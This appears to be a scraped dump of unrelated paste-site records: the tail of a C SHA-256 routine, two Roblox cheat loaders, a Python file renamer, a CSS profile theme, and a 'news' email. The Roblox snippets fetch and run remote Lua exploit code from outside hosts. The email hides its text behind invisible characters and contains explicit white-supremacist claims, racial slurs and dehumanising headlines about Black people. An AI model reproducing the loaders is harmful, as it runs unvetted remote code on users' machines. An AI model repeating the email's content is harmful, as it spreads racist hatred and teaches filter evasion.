    ctx->hash[2] = 0x3c6ef372; ctx->hash[3] = 0xa54ff53a;
    ctx->hash[4] = 0x510e527f; ctx->hash[5] = 0x9b05688c;
    ctx->hash[6] = 0x1f83d9ab; ctx->hash[7] = 0x5be0cd19;

} /* sha256_init */

/* -------------------------------------------------------------------------- */
void sha256_hash(sha256_context *ctx, uint8_t *dat, uint32_t sz)
{
    register uint32_t i = ctx->len[0] & 63, l, j;

    if ((ctx->len[0] += sz) < sz)  ++(ctx->len[1]);

    for (j = 0, l = 64-i; sz >= l; j += l, sz -= l, l = 64, i = 0)
    {
        MEMCP((char *)ctx->buf + i, &dat[j], l);
        BSWP(ctx->buf, 16 );
        _hash(ctx);
    }
    MEMCP((char *)ctx->buf + i, &dat[j], sz);

} /* _hash */

/* -------------------------------------------------------------------------- */
void sha256_done(sha256_context *ctx, uint8_t *buf)
{
    uint32_t i = (uint32_t)(ctx->len[0] & 63), j = ((~i) & 3) << 3;

    BSWP(ctx->buf, (i + 3) >> 2);

    ctx->buf[i >> 2] &= 0xffffff80 << j;  /* add padding */
    ctx->buf[i >> 2] |= 0x00000080 << j;

    if (i < 56) i = (i >> 2) + 1;
       else ctx->buf[15] ^= (i < 60) ? ctx->buf[15] : 0, _hash(ctx), i = 0;

    while (i < 14) ctx->buf[i++] = 0;

    ctx->buf[14] = (ctx->len[1] << 3)|(ctx->len[0] >> 29); /* add length */
    ctx->buf[15] = ctx->len[0] << 3;

    _hash(ctx);

    for (i = 0; i < 32; i++)
       ctx->buf[i % 16] = 0, /* may remove this line in case of a DIY cleanup */
       buf[i] = (uint8_t)(ctx->hash[i >> 2] >> ((~i & 3) << 3));

} /* sha256_done */

void sha256(uint8_t *output, uint8_t *input, int inlen)
{
	sha256_context ctx;
	
	sha256_init(&ctx);
    sha256_hash(&ctx, input, inlen);
    return sha256_done(&ctx, output);
}

#ifdef __cplusplus
}
#endif"
PJqWzz9F,Collect All Pets (THE HUNT),GETFREEROBUX,Lua,Sunday 24th of March 2024 11:10:34 PM CDT,"_G.Theme = ""Light"" 
_G.V3rmillion = true
loadstring(game:HttpGet(""https://raw.githubusercontent.com/CasperFlyModz/discord.gg-rips/main/CollectAllPets.lua""))()"
pCfuMCEr,Lumber Tycoon 2 (THE HUNT),GETFREEROBUX,Lua,Sunday 24th of March 2024 11:09:12 PM CDT,"game:HttpGet(""https://getexploits.com/cexecution/694139985821192192"")
loadstring(game:HttpGet""https://raw.githubusercontent.com/darkxwin/darkxsourcethinkyoutousedarkx/main/darkx"")()"
Rj68C1Fh,PASTEBIN-REMOVE-ID-NAME.py,Najeebsk,Python,Sunday 24th of March 2024 11:05:19 PM CDT,"import os

def remove_after_space(directory):
    for filename in os.listdir(directory):
        if ' ' in filename:
            new_filename = filename.split()[0]
            old_path = os.path.join(directory, filename)
            new_path = os.path.join(directory, new_filename)
            if os.path.exists(new_path):
                # Rename the existing file with a different name
                new_path = os.path.join(directory, new_filename + ""_renamed"")
                os.rename(old_path, new_path)
                print(f""Renamed: {filename} to {new_filename}_renamed"")
            else:
                os.rename(old_path, new_path)
                print(f""Renamed: {filename} to {new_filename}"")

# Get the current working directory
current_directory = os.getcwd()

# Call the function to remove anything after a space in filenames
remove_after_space(current_directory)
"
0cXC1pup,Pro for fknnrd,althindor,CSS,Sunday 24th of March 2024 10:39:03 PM CDT,"/* Profile by AlthIndor */

html, body {
    background: #F8F8F8;
    height: unset;
    min-height: 100vh;
}

body {
    display: flex;
    flex-flow: column nowrap;
    align-items: center;
    justify-content: center;
    padding: 160px 0 100px 0;
    box-sizing: border-box;
}
#pictures_container {order: 1;}
#columns {order: 2;}

body a {
    font-weight: 400 !important;
    text-decoration: none !important;
}

::selection {
    background: #606060;
    color: #F8F8F8;
}

/* Atlas Control */

#columns, .panel h2, .item, .avatar_decoration:nth-of-type(n+2) {background: url('https://i.imgur.com/dTNdYfH.png') no-repeat;}
#columns {background-position: 0 -80px;}
.panel h2 {background-position: -640px -80px;}
.custom_panel h2 {background-position: -640px -120px;}

.item {background-position: -640px -210px;}
.avatar_decoration:nth-of-type(n+2) {background-position: -640px -270px;}
.avatar_decoration:nth-of-type(n+2) a {mask: url('https://i.imgur.com/dTNdYfH.png') -760px -270px;}
.item:has(a:hover), .avatar_decoration:has(a:hover) {background-position-x: -700px;}

.custom_panel span {
    background:
        url('https://i.imgur.com/dTNdYfH.png') left 0,
        url('https://i.imgur.com/dTNdYfH.png') right -40px,
        linear-gradient(to left, #00000000 5px, #000000FF 5px, #000000FF calc(100% - 5px), transparent calc(100% - 5px));
}

/* Fonts */

@font-face {
    font-family: 'Press Start 2P';
    font-style: normal;
    font-weight: 400;
    src: url('https://fonts.gstatic.com/s/pressstart2p/v15/e3t4euO8T-267oIAQAu6jDQyK3nVivM.woff2') format('woff2');
}

/* Header */

#viewer #gaia_header, #gaia_header ul {background: none !important;}
#viewer #gaia_header li.spacer {display: none !important;}

#viewer #gaia_header {
    width: calc(100% - 20px) !important;
    height: 49px !important;
    position: absolute !important;
    top: 10px !important;
    left: 10px !important;
    border: 16px solid transparent;
    border-width: 14px 16px 16px 14px;
    border-image: url('https://i.imgur.com/gP6OH21.png') 14 16 16 14 fill;
    box-sizing: border-box;
}

#gaia_header ul {
    width: unset !important;
    font: 0/20px 'Press Start 2P', sans-serif !important;
    padding: 0 7px !important;
}

#gaia_header #header_right {
    float: right;
    display: grid !important;
    grid-auto-flow: column;
}
#gaia_header #header_right li:nth-of-type(4) {grid-column: 2;}

#gaia_header a, #gaia_header a::before {font-size: 8px !important;}
#gaia_header a {color: #F8F8F8 !important;}
#gaia_header a:hover {color: #A8A8A8 !important;}

#header_left img {
    mask: url('https://i.imgur.com/cGGVY2x.png') 0 0 no-repeat;
    background: currentColor;
    width: 0;
    height: 16px;
    padding: 0 34px 0 0;
}

#header_right a[href*='mode=edit'], #header_right a[href*='report.php'] {font-size: 0 !important;}
#header_right a[href*='mode=edit']::before {content: 'Edit My Own';}
#header_right a[href*='report.php']::before {content: 'Report Profile';}

#header_left li:nth-of-type(n+3)::before, #header_right li:nth-of-type(n+2)::before {
    content: '';
    display: inline-block;
    background: #A8A8A8;
    width: 4px;
    height: 4px;
    margin: 0 8px;
    position: relative;
    top: -2px;
}

/* Columns */

#columns {
    width: 628px;
    font-size: 0;
    padding-top: 254px;
    position: relative;
    top: 0;
}
#columns .column {display: contents;}

/* Panels */

.panel, .panel h2 {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

.panel {
    background: none;
    color: #000;
    font: 8px/2.5 'Press Start 2P', sans-serif;
    text-align: center;
}
.panel a {color: #A8A8A8;}
.panel a:hover {color: inherit;}

.panel h2 {
    height: 36px;
    font-size: 0;
}

#id_details, #id_about, .media_panel {position: absolute;}
#id_details h2, #id_about h2, .media_panel h2 {display: none;}

#id_about {
    width: 315px;
    height: 126px;
    top: 98px;
    left: 293px;
}

#id_wishlist, .custom_panel {
    border: 20px solid transparent;
    border-width: 20px 20px 20px 18px;
    border-image: url('https://i.imgur.com/aPDHPgh.png') 20 20 20 18;
}
#id_wishlist {margin-bottom: 10px;}

/* Details and Second Avatar */

#id_details {
    top: 64px;
    left: 28px;
}
#id_details p:nth-of-type(n+2), .forum_userstatus {display: none;}
#id_details p {margin: 0;}

.avatar_decoration:first-of-type a {
    position: absolute !important;
    bottom: -202px;
    left: 107px;
}

/* Media */

.media_panel {
    background: url('https://i.imgur.com/MWTKBXK.gif');
    width: 14px;
    height: 11px !important;
    top: 213px;
    right: 20px;
    overflow: hidden;
    filter: invert(1);
    z-index: 1;
}

.media_panel iframe {
    width: 300px;
    height: 200px;
    position: absolute;
    bottom: calc(50% - 20px);
    left: calc(50% - 35px);
    opacity: .001;
}

form .media_panel {
    font-size: 0;
    overflow: visible;
}

form .media_panel .buttons {
    width: max-content;
    position: absolute;
    top: -2px;
    right: 20px;
    filter: invert(1);
}

/* Round Tiles */

#id_wishlist, #pictures_container {
    display: grid;
    grid-auto-rows: max-content;
    gap: 10px;
}
#id_wishlist {grid-template-columns: repeat(10, 50px);}
#pictures_container {grid-template-columns: repeat(9, 52px);}

#id_wishlist a, .avatar_decoration:nth-of-type(n+2) a {
    border-radius: 50%;
    overflow: hidden;
}
#id_wishlist a, .avatar_decoration a {display: block;}

/* Wish List */

#id_wishlist h2 {grid-column: 1/-1;}
#id_wishlist .item {position: relative;}
#id_wishlist .premium_sparkle, #id_wishlist .clear {display: none;}

#id_wishlist a {
    width: 30px;
    height: 30px;
    padding: 10px;
}

.owner_checkmark {
    background: #F8F8F8;
    padding: 2px;
    margin: 0;
    bottom: 0;
    left: 0;
    border: 1px solid #A8A8A8;
    pointer-events: none;
}
#id_wishlist .item:has(a:hover) .owner_checkmark {border-color: #000;}

/* Gallery */

.custom_panel h2 {margin-bottom: 10px;}
.custom_panel span, .custom_panel img {display: block;}
.custom_panel br {display: none;}

.custom_panel h2 + div {
    max-height: 500px;
    padding: 0 10px 0 0;
    overflow: hidden scroll;
    scrollbar-color: #000 transparent;
}

.custom_panel span {
    height: 34px;
    font-size: 16px;
    line-height: 36px;
    margin: 40px auto;
    position: sticky;
    top: 0;
    box-shadow: 0 10px #F8F8F8;
    z-index: 1;
}
.custom_panel span:first-of-type {margin-top: 0;}

.custom_panel img {
    max-width: 480px !important;
    margin: 10px auto;
    mix-blend-mode: multiply;
}
.custom_panel img:last-of-type {margin-bottom: 0;}

/* Avatar Tiles */

#pictures_container {
    position: relative;
    margin: 0 0 -12px 13px;
}

.avatar_decoration {
    width: 52px !important;
    height: 52px !important;
    position: static !important;
}
.avatar_decoration .buttons {top: 0;}

.avatar_decoration:nth-of-type(1) img {
    width: unset !important;
    height: unset !important;
}

.avatar_decoration:nth-of-type(n+2) {contain: layout;}
.avatar_decoration:nth-of-type(n+2) a {padding: 2px;}

/* Saturation Effect */

#id_details, .item, .custom_panel img, .avatar_decoration a {filter: grayscale(1);}
#id_details:hover, .item:has(a:hover), .custom_panel img:hover, .avatar_decoration a:hover {filter: none;}

/* Avatar Head Grid Spacer */
/* Change 'span' Value to Change First Head Offset */

.avatar_decoration:first-of-type {grid-column: 1 / span 3;}"
bs6WRJ3e,News March24 24,Newscaster_Ned,Email,Sunday 24th of March 2024 10:01:03 PM CDT,".‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎1‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎2‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎3‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎T‎e‎s‎t‎ ‎c‎o‎m‎p‎l‎e‎t‎e‎.‎

W‎h‎i‎t‎e‎s‎ ‎a‎r‎e‎ ‎t‎h‎e‎ ‎s‎u‎p‎e‎r‎i‎o‎r‎ ‎r‎a‎c‎e‎.‎

U‎C‎ ‎B‎e‎r‎k‎e‎l‎e‎y‎ ‎P‎r‎o‎f‎e‎s‎s‎o‎r‎ ‎A‎p‎o‎l‎o‎g‎i‎z‎e‎s‎ ‎f‎o‎r‎ ‎'‎M‎i‎s‎o‎g‎y‎n‎i‎s‎t‎'‎ ‎C‎o‎m‎m‎e‎n‎t‎ ‎o‎n‎ ‎D‎a‎t‎i‎n‎g‎
P‎o‎l‎l‎:‎ ‎T‎r‎u‎m‎p‎ ‎N‎a‎r‎r‎o‎w‎l‎y‎ ‎L‎e‎a‎d‎s‎ ‎B‎i‎d‎e‎n‎ ‎i‎n‎ ‎S‎w‎i‎n‎g‎-‎S‎t‎a‎t‎e‎ ‎M‎i‎c‎h‎i‎g‎a‎n‎
W‎A‎T‎C‎H‎:‎ ‎N‎Y‎C‎ ‎M‎o‎m‎ ‎R‎e‎s‎c‎u‎e‎s‎ ‎T‎e‎e‎n‎ ‎D‎a‎u‎g‎h‎t‎e‎r‎ ‎f‎r‎o‎m‎ ‎A‎l‎l‎e‎g‎e‎d‎ ‎K‎i‎d‎n‎a‎p‎p‎e‎r‎
K‎a‎m‎a‎l‎a‎ ‎C‎l‎a‎p‎s‎ ‎t‎o‎ ‎P‎r‎o‎t‎e‎s‎t‎ ‎S‎o‎n‎g‎ ‎B‎e‎f‎o‎r‎e‎ ‎T‎r‎a‎n‎s‎l‎a‎t‎i‎o‎n‎
P‎a‎s‎t‎o‎r‎ ‎F‎r‎e‎e‎d‎ ‎A‎f‎t‎e‎r‎ ‎Y‎e‎a‎r‎s‎ ‎i‎n‎ ‎J‎a‎i‎l‎ ‎I‎s‎ ‎T‎r‎a‎p‎p‎e‎d‎ ‎i‎n‎ ‎C‎h‎i‎n‎a‎ ‎W‎i‎t‎h‎o‎u‎t‎ ‎I‎D‎
G‎e‎t‎ ‎A‎l‎l‎ ‎B‎r‎e‎i‎t‎b‎a‎r‎t‎ ‎N‎e‎w‎s‎ ‎H‎e‎r‎e‎
H‎o‎m‎e‎P‎a‎g‎e‎
K‎a‎m‎a‎l‎a‎ ‎C‎l‎a‎p‎s‎ ‎A‎l‎o‎n‎g‎ ‎t‎o‎ ‎P‎u‎e‎r‎t‎o‎ ‎R‎i‎c‎a‎n‎ ‎P‎r‎o‎t‎e‎s‎t‎ ‎S‎o‎n‎g‎ ‎B‎e‎f‎o‎r‎e‎ ‎R‎e‎a‎l‎i‎z‎i‎n‎g‎ ‎I‎t‎’‎s‎ ‎A‎g‎a‎i‎n‎s‎t‎ ‎H‎e‎r‎

V‎i‎d‎e‎o‎:‎ ‎V‎E‎E‎P‎ ‎S‎u‎f‎f‎e‎r‎s‎ ‎E‎m‎b‎a‎r‎r‎a‎s‎s‎i‎n‎g‎ ‎M‎o‎m‎e‎n‎t‎…‎ ‎A‎g‎a‎i‎n‎

S‎i‎g‎n‎s‎:‎ ‎K‎a‎m‎a‎l‎a‎ ‎H‎a‎r‎r‎i‎s‎ ‎a‎ ‎W‎a‎r‎ ‎C‎r‎i‎m‎i‎n‎a‎l‎
V‎i‎c‎e‎ ‎P‎r‎e‎s‎i‎d‎e‎n‎t‎ ‎K‎a‎m‎a‎l‎a‎ ‎H‎a‎r‎r‎i‎s‎,‎ ‎l‎e‎f‎t‎,‎ ‎a‎n‎d‎ ‎F‎r‎a‎n‎k‎i‎e‎ ‎M‎i‎r‎a‎n‎d‎a‎,‎ ‎H‎i‎s‎p‎a‎n‎i‎c‎ ‎F‎e‎d‎e‎r‎a‎t‎i‎o‎n‎ ‎p‎r‎e‎s‎i‎d‎e‎n‎t‎,‎ ‎a‎p‎
V‎i‎c‎e‎ ‎P‎r‎e‎s‎i‎d‎e‎n‎t‎ ‎K‎a‎m‎a‎l‎a‎ ‎H‎a‎r‎r‎i‎s‎ ‎h‎a‎d‎ ‎a‎n‎ ‎e‎m‎b‎a‎r‎r‎a‎s‎s‎i‎n‎g‎ ‎f‎u‎m‎b‎l‎e‎ ‎d‎u‎r‎i‎n‎g‎ ‎a‎ ‎F‎r‎i‎d‎a‎y‎ ‎v‎i‎s‎i‎t‎ ‎t‎o‎ ‎P‎u‎e‎r‎t‎o‎ ‎R‎i‎c‎o‎,‎ ‎w‎h‎e‎r‎e‎ ‎s‎h‎e‎ ‎w‎a‎s‎ ‎s‎p‎o‎t‎t‎e‎d‎ ‎c‎l‎a‎p‎p‎i‎n‎g‎ ‎a‎l‎o‎n‎g‎ ‎t‎o‎ ‎a‎ ‎p‎r‎o‎t‎e‎s‎t‎ ‎s‎o‎n‎g‎ ‎a‎g‎a‎i‎n‎s‎t‎ ‎h‎e‎r‎ ‎b‎e‎f‎o‎r‎e‎ ‎a‎n‎ ‎a‎i‎d‎e‎ ‎t‎r‎a‎n‎s‎l‎a‎t‎e‎d‎ ‎t‎h‎e‎ ‎l‎y‎r‎i‎c‎s‎.‎

S‎e‎n‎a‎t‎e‎ ‎A‎v‎e‎r‎t‎s‎ ‎S‎h‎u‎t‎d‎o‎w‎n‎ ‎w‎i‎t‎h‎ ‎E‎a‎r‎l‎y‎ ‎S‎a‎t‎u‎r‎d‎a‎y‎ ‎M‎o‎r‎n‎i‎n‎g‎ ‎V‎o‎t‎e‎
S‎e‎n‎a‎t‎e‎ ‎A‎v‎e‎r‎t‎s‎ ‎S‎h‎u‎t‎d‎o‎w‎n‎ ‎w‎i‎t‎h‎ ‎E‎a‎r‎l‎y‎ ‎S‎a‎t‎u‎r‎d‎a‎y‎ ‎M‎o‎r‎n‎i‎n‎g‎ ‎V‎o‎t‎e‎
8‎,‎8‎5‎9‎
K‎a‎m‎a‎l‎a‎ ‎H‎a‎r‎r‎i‎s‎ ‎S‎a‎y‎s‎ ‎‘‎C‎o‎n‎s‎e‎q‎u‎e‎n‎c‎e‎s‎’‎ ‎P‎o‎s‎s‎i‎b‎l‎e‎ ‎i‎f‎ ‎I‎s‎r‎a‎e‎l‎ ‎R‎a‎i‎d‎s‎ ‎R‎a‎f‎a‎h‎;‎ ‎‘‎I‎ ‎H‎a‎v‎e‎ ‎S‎t‎u‎d‎i‎e‎d‎
K‎a‎m‎a‎l‎a‎ ‎H‎a‎r‎r‎i‎s‎ ‎S‎a‎y‎s‎ ‎'‎C‎o‎n‎s‎e‎q‎u‎e‎n‎c‎e‎s‎'‎ ‎P‎o‎s‎s‎i‎b‎l‎e‎ ‎i‎f‎ ‎I‎s‎r‎a‎e‎l‎ ‎R‎a‎i‎d‎s‎ ‎R‎a‎f‎a‎h‎
4‎,‎9‎2‎4‎
R‎u‎s‎s‎i‎a‎ ‎A‎n‎n‎o‎u‎n‎c‎e‎s‎ ‎1‎1‎ ‎A‎r‎r‎e‎s‎t‎s‎ ‎A‎f‎t‎e‎r‎ ‎M‎o‎s‎c‎o‎w‎ ‎C‎o‎n‎c‎e‎r‎t‎ ‎H‎a‎l‎l‎ ‎T‎e‎r‎r‎o‎r‎ ‎A‎t‎t‎a‎c‎k‎ ‎T‎h‎a‎t‎ ‎L‎e‎f‎t‎ ‎A‎t‎ ‎L‎e‎a‎s‎t‎ ‎1‎1‎5‎ ‎D‎e‎a‎d‎
R‎u‎s‎s‎i‎a‎ ‎A‎n‎n‎o‎u‎n‎c‎e‎s‎ ‎1‎1‎ ‎A‎r‎r‎e‎s‎t‎s‎ ‎A‎f‎t‎e‎r‎ ‎M‎o‎s‎c‎o‎w‎ ‎C‎o‎n‎c‎e‎r‎t‎ ‎H‎a‎l‎l‎ ‎T‎e‎r‎r‎o‎r‎ ‎A‎t‎t‎a‎c‎k‎
4‎,‎2‎8‎0‎
‘‎S‎o‎m‎e‎o‎n‎e‎ ‎C‎o‎u‎l‎d‎ ‎T‎u‎c‎k‎ ‎a‎ ‎B‎o‎m‎b‎ ‎o‎n‎ ‎a‎ ‎T‎r‎u‎c‎k‎’‎:‎ ‎U‎.‎S‎.‎ ‎O‎f‎f‎i‎c‎i‎a‎l‎s‎ ‎W‎a‎r‎n‎ ‎B‎i‎d‎e‎n‎’‎s‎ ‎G‎a‎z‎a‎ ‎A‎i‎d‎ ‎P‎l‎a‎n‎
'‎S‎o‎m‎e‎o‎n‎e‎ ‎C‎o‎u‎l‎d‎ ‎T‎u‎c‎k‎ ‎a‎ ‎B‎o‎m‎b‎ ‎o‎n‎ ‎a‎ ‎T‎r‎u‎c‎k‎'‎:‎ ‎B‎i‎d‎e‎n‎ ‎G‎a‎z‎a‎ ‎P‎l‎a‎n‎ ‎M‎a‎y‎ ‎E‎n‎d‎a‎n‎g‎e‎r‎ ‎T‎r‎o‎o‎p‎s‎
2‎,‎3‎0‎6‎
O‎c‎a‎s‎i‎o‎-‎C‎o‎r‎t‎e‎z‎:‎ ‎T‎r‎u‎m‎p‎ ‎‘‎O‎r‎d‎e‎r‎e‎d‎ ‎E‎s‎s‎e‎n‎t‎i‎a‎l‎l‎y‎ ‎a‎ ‎T‎e‎r‎r‎o‎r‎i‎s‎t‎ ‎A‎t‎t‎a‎c‎k‎’‎ ‎o‎n‎ ‎t‎h‎e‎ ‎U‎.‎S‎.‎ ‎C‎a‎p‎i‎t‎o‎l‎
O‎c‎a‎s‎i‎o‎-‎C‎o‎r‎t‎e‎z‎:‎ ‎T‎r‎u‎m‎p‎ ‎‘‎O‎r‎d‎e‎r‎e‎d‎ ‎E‎s‎s‎e‎n‎t‎i‎a‎l‎l‎y‎ ‎a‎ ‎T‎e‎r‎r‎o‎r‎i‎s‎t‎ ‎A‎t‎t‎a‎c‎k‎’‎ ‎o‎n‎ ‎t‎h‎e‎ ‎U‎.‎S‎.‎
8‎,‎3‎8‎3‎
R‎e‎p‎o‎r‎t‎:‎ ‎W‎a‎s‎h‎i‎n‎g‎t‎o‎n‎ ‎‘‎T‎r‎a‎n‎s‎-‎I‎d‎e‎n‎t‎i‎f‎y‎i‎n‎g‎ ‎M‎a‎l‎e‎ ‎I‎n‎m‎a‎t‎e‎’‎ ‎H‎a‎d‎ ‎S‎e‎x‎ ‎w‎i‎t‎h‎ ‎F‎e‎m‎a‎l‎e‎ ‎P‎r‎i‎s‎o‎n‎e‎r‎ ‎i‎n‎ ‎C‎e‎l‎l‎
R‎e‎p‎o‎r‎t‎:‎ ‎W‎A‎ ‎'‎T‎r‎a‎n‎s‎-‎I‎d‎e‎n‎t‎i‎f‎y‎i‎n‎g‎ ‎M‎a‎l‎e‎ ‎I‎n‎m‎a‎t‎e‎'‎ ‎H‎a‎d‎ ‎S‎e‎x‎ ‎w‎i‎t‎h‎ ‎F‎e‎m‎a‎l‎e‎ ‎P‎r‎i‎s‎o‎n‎e‎r‎
1‎4‎5‎
C‎o‎n‎n‎e‎c‎t‎i‎c‎u‎t‎ ‎A‎m‎e‎n‎d‎m‎e‎n‎t‎ ‎W‎o‎u‎l‎d‎ ‎E‎n‎s‎h‎r‎i‎n‎e‎ ‎P‎r‎o‎t‎e‎c‎t‎i‎o‎n‎s‎ ‎f‎o‎r‎ ‎G‎e‎n‎d‎e‎r‎ ‎I‎d‎e‎n‎t‎i‎t‎y‎,‎ ‎A‎b‎o‎r‎t‎i‎o‎n‎
C‎T‎ ‎D‎e‎m‎o‎c‎r‎a‎t‎s‎ ‎L‎o‎o‎k‎ ‎t‎o‎ ‎E‎n‎s‎h‎r‎i‎n‎e‎ ‎P‎r‎o‎t‎e‎c‎t‎i‎o‎n‎s‎ ‎f‎o‎r‎ ‎G‎e‎n‎d‎e‎r‎ ‎I‎d‎e‎n‎t‎i‎t‎y‎,‎ ‎A‎b‎o‎r‎t‎i‎o‎n‎
1‎2‎6‎
‘‎T‎h‎e‎ ‎M‎e‎s‎s‎a‎g‎e‎ ‎I‎s‎ ‎T‎o‎o‎ ‎F‎e‎m‎i‎n‎i‎n‎e‎’‎:‎ ‎J‎a‎m‎e‎s‎ ‎C‎a‎r‎v‎i‎l‎l‎e‎ ‎S‎l‎a‎m‎s‎ ‎D‎e‎m‎o‎c‎r‎a‎t‎ ‎S‎t‎r‎a‎t‎e‎g‎y‎,‎ ‎B‎i‎d‎e‎n‎’‎s‎ ‎L‎o‎
C‎a‎r‎v‎i‎l‎l‎e‎:‎ ‎D‎e‎m‎o‎c‎r‎a‎t‎ ‎M‎e‎s‎s‎a‎g‎e‎ ‎I‎s‎ ‎'‎T‎o‎o‎ ‎F‎e‎m‎i‎n‎i‎n‎e‎'‎ ‎t‎o‎ ‎H‎e‎l‎p‎ ‎B‎i‎d‎e‎n‎
2‎9‎3‎
T‎o‎d‎d‎:‎ ‎J‎o‎u‎r‎n‎a‎l‎i‎s‎t‎s‎ ‎a‎t‎ ‎N‎B‎C‎ ‎N‎e‎w‎s‎ ‎‘‎U‎n‎c‎o‎m‎f‎o‎r‎t‎a‎b‎l‎e‎’‎ ‎w‎i‎t‎h‎ ‎H‎i‎r‎i‎n‎g‎ ‎o‎f‎ ‎R‎o‎n‎n‎a‎ ‎M‎c‎D‎a‎n‎i‎e‎l‎
T‎o‎d‎d‎:‎ ‎J‎o‎u‎r‎n‎a‎l‎i‎s‎t‎s‎ ‎a‎t‎ ‎N‎B‎C‎ ‎N‎e‎w‎s‎ ‎'‎U‎n‎c‎o‎m‎f‎o‎r‎t‎a‎b‎l‎e‎'‎ ‎w‎i‎t‎h‎ ‎H‎i‎r‎i‎n‎g‎ ‎o‎f‎ ‎R‎o‎n‎n‎a‎ ‎M‎c‎D‎a‎n‎i‎e‎l‎
1‎,‎0‎8‎5‎
T‎r‎a‎n‎s‎g‎e‎n‎d‎e‎r‎ ‎‘‎T‎r‎e‎a‎t‎m‎e‎n‎t‎s‎’‎ ‎f‎o‎r‎ ‎C‎h‎i‎l‎d‎r‎e‎n‎ ‎O‎n‎e‎ ‎o‎f‎ ‎t‎h‎e‎ ‎‘‎G‎r‎e‎a‎t‎e‎s‎t‎ ‎E‎t‎h‎i‎c‎a‎l‎ ‎S‎c‎a‎n‎d‎a‎l‎s‎ ‎i‎n‎ ‎M‎e‎
T‎r‎a‎n‎s‎ ‎T‎r‎e‎a‎t‎m‎e‎n‎t‎ ‎f‎o‎r‎ ‎K‎i‎d‎s‎ ‎O‎n‎e‎ ‎o‎f‎ ‎t‎h‎e‎ ‎'‎G‎r‎e‎a‎t‎e‎s‎t‎ ‎E‎t‎h‎i‎c‎a‎l‎ ‎S‎c‎a‎n‎d‎a‎l‎s‎'‎

N‎e‎g‎r‎e‎s‎s‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎4‎0‎+‎ ‎T‎i‎m‎e‎s‎ ‎A‎f‎t‎e‎r‎ ‎S‎h‎o‎w‎i‎n‎g‎ ‎H‎e‎r‎ ‎a‎s‎s‎ ‎t‎o‎ ‎P‎e‎o‎p‎l‎e‎ ‎H‎e‎r‎ ‎N‎e‎i‎g‎h‎b‎o‎r‎s‎ ‎i‎n‎ ‎A‎s‎h‎v‎i‎e‎w‎ ‎H‎e‎i‎g‎h‎t‎s‎ ‎i‎n‎ ‎S‎o‎u‎t‎h‎e‎a‎s‎t‎ ‎A‎t‎l‎a‎n‎t‎a‎.‎

M‎o‎r‎e‎ ‎l‎i‎k‎e‎ ‎A‎s‎s‎v‎i‎e‎w‎ ‎H‎e‎i‎g‎h‎t‎s‎,‎ ‎a‎m‎i‎r‎i‎t‎e‎?‎


S‎i‎m‎i‎a‎n‎ ‎R‎a‎p‎i‎s‎t‎ ‎a‎n‎d‎ ‎D‎r‎u‎g‎ ‎D‎e‎a‎l‎e‎r‎ ‎W‎h‎o‎ ‎K‎i‎l‎l‎e‎d‎ ‎W‎h‎i‎t‎e‎ ‎M‎a‎n‎ ‎a‎t‎ ‎A‎g‎e‎ ‎1‎1‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎f‎o‎r‎ ‎D‎e‎a‎l‎i‎n‎g‎ ‎D‎r‎u‎g‎s‎.‎


3‎ ‎S‎h‎e‎b‎o‎o‎n‎s‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎i‎n‎ ‎P‎e‎p‎p‎e‎r‎s‎p‎r‎a‎y‎i‎n‎g‎ ‎H‎a‎t‎e‎ ‎C‎r‎i‎m‎e‎ ‎o‎n‎ ‎M‎a‎n‎h‎a‎t‎t‎a‎n‎ ‎S‎u‎b‎w‎a‎y‎.‎


N‎e‎g‎r‎o‎e‎s‎ ‎C‎h‎i‎m‎p‎o‎u‎t‎ ‎a‎n‎d‎ ‎T‎h‎r‎o‎w‎ ‎C‎h‎a‎i‎r‎s‎ ‎U‎p‎o‎n‎ ‎A‎r‎r‎i‎v‎a‎l‎ ‎o‎f‎ ‎N‎e‎g‎r‎o‎ ‎R‎a‎p‎p‎e‎r‎ ‎a‎t‎ ‎Q‎u‎e‎e‎n‎s‎ ‎C‎e‎n‎t‎e‎r‎ ‎M‎a‎l‎l‎.‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎B‎l‎a‎c‎k‎s‎ ‎a‎r‎e‎ ‎g‎e‎t‎t‎i‎n‎g‎ ‎m‎o‎r‎e‎ ‎i‎n‎t‎e‎l‎l‎i‎g‎e‎n‎t‎.‎.‎.‎ ‎W‎e‎a‎t‎h‎e‎r‎.‎

1‎0‎ ‎D‎a‎y‎ ‎W‎e‎a‎t‎h‎e‎r‎-‎D‎a‎l‎e‎,‎ ‎T‎X‎
A‎s‎ ‎o‎f‎ ‎9‎:‎2‎8‎ ‎a‎m‎ ‎C‎D‎T‎
T‎o‎d‎a‎y‎
C‎l‎o‎u‎d‎y‎
7‎3‎°‎
/‎6‎3‎°‎
5‎%‎
S‎S‎E‎ ‎2‎0‎ ‎m‎p‎h‎
S‎u‎n‎ ‎2‎4‎ ‎|‎ ‎D‎a‎y‎
7‎3‎°‎
5‎%‎
S‎S‎E‎
2‎0‎
 ‎
m‎p‎h‎
C‎l‎o‎u‎d‎y‎.‎ ‎H‎i‎g‎h‎ ‎7‎3‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎S‎S‎E‎ ‎a‎t‎ ‎1‎5‎ ‎t‎o‎ ‎2‎5‎ ‎m‎p‎h‎.‎ ‎H‎i‎g‎h‎e‎r‎ ‎w‎i‎n‎d‎ ‎g‎u‎s‎t‎s‎ ‎p‎o‎s‎s‎i‎b‎l‎e‎.‎
 ‎
H‎u‎m‎i‎d‎i‎t‎y‎
7‎4‎%‎
